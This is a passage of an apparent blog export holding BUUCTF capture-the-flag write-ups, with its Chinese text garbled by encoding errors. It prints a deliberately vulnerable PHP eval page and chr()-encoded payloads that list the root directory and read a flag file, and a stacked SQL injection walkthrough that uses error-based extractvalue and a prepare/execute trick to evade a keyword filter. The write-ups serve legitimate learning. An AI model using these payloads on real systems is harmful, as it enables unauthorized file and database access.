ä»¥getæ–¹å¼æäº¤ä¸€ä¸ª$numå˜é‡\n\nå‘ç°é»‘åå•è¿‡æ»¤\n\n```php\n<?php\nerror_reporting(0);\nif(!isset($_GET['num'])){\n    show_source(__FILE__);\n}else{\n        $str = $_GET['num'];\n        $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]','\\$','\\\\','\\^'];\n        foreach ($blacklist as $blackitem) {\n                if (preg_match('/' . $blackitem . '/m', $str)) {\n                        die(\"what are you want to do?\");\n                }\n        }\n        eval('echo '.$str.';');\n}\n?>\n```\n\nå‘ç°å¥½å¤šè¯»æ–‡ä»¶çš„ç©ºæ ¼ï¼Œæ–œæ éƒ½è¢«é»‘åå•äº†ã€‚\n\ncsdnæœ‰ä¸€ç¯‡æ€»ç»“çš„å¾ˆå¥½ï¼Œæ‹‰è¿‡æ¥\n\nçŸ¥è¯†ç‚¹ï¼š\n\nchr() å‡½æ•°ï¼šä»æŒ‡å®šçš„ ASCII å€¼è¿”å›å­—ç¬¦ã€‚ ASCII å€¼å¯è¢«æŒ‡å®šä¸ºåè¿›åˆ¶å€¼ã€å…«è¿›åˆ¶å€¼æˆ–åå…­è¿›åˆ¶å€¼ã€‚å…«è¿›åˆ¶å€¼è¢«å®šä¹‰ä¸ºå¸¦å‰ç½®0ï¼Œè€Œåå…­è¿›åˆ¶å€¼è¢«å®šä¹‰ä¸ºå¸¦å‰ç½® 0xã€‚\n\n file_get_contents() å‡½æ•°ï¼šæŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚è¯¥å‡½æ•°æ˜¯ç”¨äºæŠŠæ–‡ä»¶çš„å†…å®¹è¯»å…¥åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­çš„é¦–é€‰æ–¹æ³•ã€‚å¦‚æœæœåŠ¡å™¨æ“ä½œç³»ç»Ÿæ”¯æŒï¼Œè¿˜ä¼šä½¿ç”¨å†…å­˜æ˜ å°„æŠ€æœ¯æ¥å¢å¼ºæ€§èƒ½ã€‚\n\n PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§ï¼šPHPéœ€è¦å°†æ‰€æœ‰å‚æ•°è½¬æ¢ä¸ºæœ‰æ•ˆçš„å˜é‡åï¼Œå› æ­¤åœ¨è§£ææŸ¥è¯¢å­—ç¬¦ä¸²æ—¶ï¼Œå®ƒä¼šåšä¸¤ä»¶äº‹ï¼š1.åˆ é™¤ç©ºç™½ç¬¦ 2.å°†æŸäº›å­—ç¬¦è½¬æ¢ä¸ºä¸‹åˆ’çº¿ï¼ˆåŒ…æ‹¬ç©ºæ ¼ï¼‰ã€å½“wafä¸è®©ä½ è¿‡çš„æ—¶å€™ï¼Œphpå´å¯ä»¥è®©ä½ è¿‡ã€‘ã€‚å‡å¦‚wafä¸å…è®¸numå˜é‡ä¼ é€’å­—æ¯ï¼Œå¯ä»¥åœ¨numå‰åŠ ä¸ªç©ºæ ¼ï¼Œè¿™æ ·wafå°±æ‰¾ä¸åˆ°numè¿™ä¸ªå˜é‡äº†ï¼Œå› ä¸ºç°åœ¨çš„å˜é‡å«â€œ numâ€ï¼Œè€Œä¸æ˜¯â€œnumâ€ã€‚ä½†phpåœ¨è§£æçš„æ—¶å€™ï¼Œä¼šå…ˆæŠŠç©ºæ ¼ç»™å»æ‰ï¼Œè¿™æ ·æˆ‘ä»¬çš„ä»£ç è¿˜èƒ½æ­£å¸¸è¿è¡Œï¼Œè¿˜ä¸Šä¼ äº†éæ³•å­—ç¬¦ã€‚\n\n scandir() å‡½æ•°ï¼šè¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚\n\næ„é€ ï¼š`? num=var_dump(scandir(chr(47)))`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082348852.png)\n\nå‘ç°flagæ–‡ä»¶ï¼Œç°åœ¨æ„é€ payloadå°†é‡Œé¢å†…å®¹è¯»å‡ºæ¥å°±è¡Œäº†\n\n```\n? num=print_r(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))\n```\n\nè¿™é‡Œæœ€å¥½ä¸ç”¨echo å› ä¸ºç©ºæ ¼è¢«é»‘åå•äº† ç”¨print_ræˆ–è€…var_dumpéƒ½è¡Œ\n","tags":["æ–‡ä»¶åŒ…å«","phpå­—ç¬¦ä¸²è§£æç‰¹æ€§"],"categories":["buuctf"]},{"title":"buuctf 6-[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨","url":"/post/73bb3fc4.html","content":"\nbuuctf [å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨\n\n<!--more-->\n\næ­£å¸¸æ“ä½œåï¼Œå‘ç°åªæœ‰ä¸¤åˆ—ï¼Œç„¶åæœ‰æ­£åˆ™åŒ¹é…è¿‡æ»¤äº†\n\nreturn preg_match(\"/select|update|delete|drop|insert|where|\\./i\",$inject);\n\nè¿™é¢˜è€ƒäº†å †å æ³¨å…¥ï¼ŒåŸç†å¾ˆç®€å•ï¼Œå°±æ˜¯é€šè¿‡ `;` å·æ³¨å…¥å¤šæ¡SQLè¯­å¥ã€‚\n\n```\n-1';show databases;\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082349074.png)\n\nçœ‹ä¸€ä¸‹å½“å‰çš„æ•°æ®åº“ï¼Œè¿™é‡Œè€ƒåˆ°äº†æŠ¥é”™æ³¨å…¥\n\nåŸç†ï¼š\n\nMySQLæä¾›äº†ä¸€ä¸ª updatexml() å‡½æ•°ï¼Œå½“ç¬¬äºŒä¸ªå‚æ•°åŒ…å«ç‰¹æ®Šç¬¦å·æ—¶ä¼šæŠ¥é”™ï¼Œå¹¶å°†ç¬¬äºŒä¸ªå‚æ•°çš„å†…å®¹æ˜¾ç¤ºåœ¨æŠ¥é”™ä¿¡æ¯ä¸­ã€‚\n\nä½†æ˜¯è¿™é¢˜updateè¢«è¿‡æ»¤äº†\n\nextractvalue() ä¼ å‚æ—¶å€™ç¨æœ‰ä¸åŒï¼Œå…¶ä½™éƒ½æ˜¯ä¸€æ ·çš„ï¼Œç”¨è¿™ä¸¤ä¸ªå‡½æ•°æ—¶ï¼Œå¸¸å¸¸ç”¨åˆ°æ‹¼æ¥å‡½æ•°ï¼Œå°†è¦è¦æŸ¥è¯¢çš„è¯­å¥å’Œç¬¬äºŒä¸ªç‰¹æ®Šç¬¦å·æ‹¼æ¥èµ·æ¥ä¸€èµ·å›æ˜¾ã€‚\n\nsqlé‡Œæ‹¼æ¥å‡½æ•°ï¼šconcatï¼Œconcat_ws ,group_concat\n\n`1' and extractvalue(1,concat(0x7e,database(),0x7e));` 0x7e æ˜¯åå…­è¿›åˆ¶~\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082349098.png)\n\nå½“å‰æ•°æ®åº“åœ¨supersqli æ³¨æ„ç»“æœæ˜¯æŒ‰ç…§æŠ¥é”™çš„æ–¹å¼å›æ˜¾çš„ã€‚\n\n`-1';show tables;`çˆ†è¡¨\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082349087.png)\n\nflagåœ¨é‚£ä¸²æ•°å­—é‡Œ\n\nè¡¨åä¸ºæ•°å­—æ—¶ï¼Œè¦ç”¨åå¼•å·åŒ…èµ·æ¥æŸ¥è¯¢ã€‚\n\n```\n-1';show columns from `1919810931114514`;\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082349045.png)\n\nç„¶åè¦ä½¿ç”¨å­˜å‚¨è¿‡ç¨‹é¢„ç¼–è¯‘çŸ¥è¯†ï¼Œæ„é€ èƒ½æ‰§è¡Œçš„è¯­å¥\n\næ–¹æ³•ä¸€ï¼š\n\nset @name1 = sql è¯­å¥ï¼›\n\nprepare name2 from @name1\n\nEXECUTE name2\n\næ³¨æ„ï¼šä¸€ä¸ª@æ˜¯ç”¨æˆ·å˜é‡ï¼Œä¸¤ä¸ª@æ˜¯ç³»ç»Ÿå˜é‡\n\næ–¹æ³•äºŒï¼š\n\nprepare name1 from ä¸€ä¸ªsqlè¯­å¥;\n\nEXECUTE name1ï¼›\n\n\n\nname1,name2çš„æ„æ€æ˜¯ä¸€ä¸ªåå­—\n\nå…¶å®ä¸¤è€…åŸç†éƒ½ä¸€æ ·\n\næ„é€ ï¼š\n\n```\n1';set @a = concat('se','lect * from `1919810931114514`;');prepare b from @a;EXECUTE b;\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082349034.png)\n\nstrstr()å‡½æ•°å¯¹å¤§å°å†™å¾ˆæ•æ„Ÿï¼Œé€šè¿‡å¤§å†™ç»•è¿‡å³å¯ã€‚\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082349106.png)\n\n```\n1';Set @a = concat('se','lect * from `1919810931114514`;'); Prepare b from @a; EXECUTE b;\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082349435.png)\n","tags":["sqlæ³¨å…¥","å †å æ³¨å…¥","æŠ¥é”™æ³¨å…¥"],"categories":["buuctf"]},{"title":"å°ç ´ç«™ç ´å£³äº†","url":"/post/1c316701.html","content":"\næƒ³æ¥æƒ³å»ï¼Œçœ‹äº†å…¶ä»–è®¸å¤šå¤§ä½¬çš„æ–‡ç« ï¼Œèµ·åˆèŒç”Ÿäº†æƒ³å»ºé€ ä¸€ä¸ªå±äºè‡ªå·±çš„ç½‘ç«™ï¼Œä½†æ˜¯å»ºç«™ä¸æ˜¯ä¸€ä¸ªç®€å•çš„äº‹æƒ…ï¼Œåªé æˆ‘ç°åœ¨çš„çŸ¥è¯†æ°´å¹³æ˜¯å®Œå…¨ä¸å¤Ÿçš„ï¼Œäºæ˜¯å°±æƒ³ç®€å•ç®€ç­”çš„å»ºé€ ä¸€ä¸ªåšå®¢ï¼Œç”¨æ¥åˆ†äº«æˆ‘çš„ä¸€äº›åšé¢˜è¿‡ç¨‹ä¸ç”Ÿæ´»çäº‹ã€‚\n\n<!--more-->\n\n2023.2.5ï¼Œä»Šå¤©å±äºæˆ‘çš„åšå®¢å°ç ´ç«™å»ºæˆäº†ï¼ˆå¼€å¿ƒ~ï¼‰ï¼Œè™½ç„¶åªæ˜¯ç®€å•è¿ç”¨äº†hexoå’Œå¤§å®¶éƒ½çŸ¥é“çš„nextä¸»é¢˜ï¼Œå‚»ç“œå¼å»ºé€ æœ€åä¸Šä¼ è‡³githubï¼Œä½†æ˜¯æ•´ä¸ªè¿‡ç¨‹è¿˜æ˜¯è›®æ›²æŠ˜çš„ï¼Œå»ºé€ è¿‡ç¨‹æŠ¥äº†å¥½å¤šé”™è¯¯ï¼Œä½†æ˜¯è¿˜æ˜¯é ç€æŸ¥è¯¢ä¸€ç‚¹ä¸€ç‚¹ä¿®æ”¹ï¼Œæœ€ç»ˆä¸€ä¸ªç®€ç®€å•å•çš„å°åšå®¢ç«™å»ºå¥½äº†ã€‚\n\nåœ¨è¿™ä¸ªåšå®¢ä¸­æˆ‘ä¼šç”¨æ¥åˆ†äº«ä¸€äº›åšé¢˜åˆ·é¢˜çš„è¿‡ç¨‹ï¼Œå…¶å®å°±æ˜¯ç›‘ç£è‡ªå·±ï¼Œä¸è¦ä¸‰å¤©æ‰“é±¼ä¸¤å¤©æ™’ç½‘ã€‚å¦‚æœä½ çœ‹åˆ°æˆ‘çš„wpä¸­æœ‰é”™è¯¯ï¼Œæˆ‘éå¸¸æ¬¢è¿æ‚¨èƒ½ç»™æˆ‘æŒ‡å‡ºã€‚å…¶æ¬¡åˆ†äº«ä¸€ä¸‹è‡ªå·±åœ¨ç”Ÿæ´»ä¸­çš„æ‰€è§æ‰€é—»æ‰€æ„Ÿï¼Œè®©ä¹‹åçš„è‡ªå·±å›å‘³ä¼šè§‰å¾—ä¹‹å‰çš„æ—¥å­è¿‡å¾—æœ‰æ„ä¹‰ä¸€ç‚¹ã€‚\n\nå¸Œæœ›æˆ‘èƒ½å®ˆä½è‡ªå·±çš„åˆå¿ƒ\n\n2023.2.5 \n\nZ1d10t\n\n"}]